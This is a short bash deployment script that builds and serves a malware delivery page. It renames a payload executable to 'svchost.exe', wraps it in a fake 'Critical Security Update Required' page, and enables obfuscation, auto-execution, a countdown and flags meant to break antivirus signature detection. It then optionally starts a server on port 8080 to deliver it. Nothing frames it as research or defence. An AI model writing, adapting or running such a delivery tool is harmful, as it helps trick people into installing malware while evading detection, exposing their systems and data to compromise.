#!/bin/bash
# File: deploy.sh

# Set environment variables
PAYLOAD_DIR="./payloads"
PAYLOAD_NAME="rust-run.exe"
DELIVERY_NAME="svchost.exe"
PAGE_TITLE="Critical Security Update Required"
DELIVERY_PORT=8080

# Check if payload exists
if [ ! -f "$PAYLOAD_DIR/$PAYLOAD_NAME" ]; then
  echo "[!] Error: Payload not found at $PAYLOAD_DIR/$PAYLOAD_NAME"
  exit 1
fi

# Build the delivery system
node src/build.js \
  --build-exe \
  --build-delivery \
  --package-tool custom-rust-run \
  --exe-name "$DELIVERY_NAME" \
  --page-title "$PAGE_TITLE" \
  --obfuscate \
  --auto-execute \
  --break-signature-detection \
  --countdown 15

# Start delivery server for testing
if [ "$1" == "--serve" ]; then
  echo "[+] Starting delivery server on port $DELIVERY_PORT..."
  node src/build.js --serve --port $DELIVERY_PORT
fi
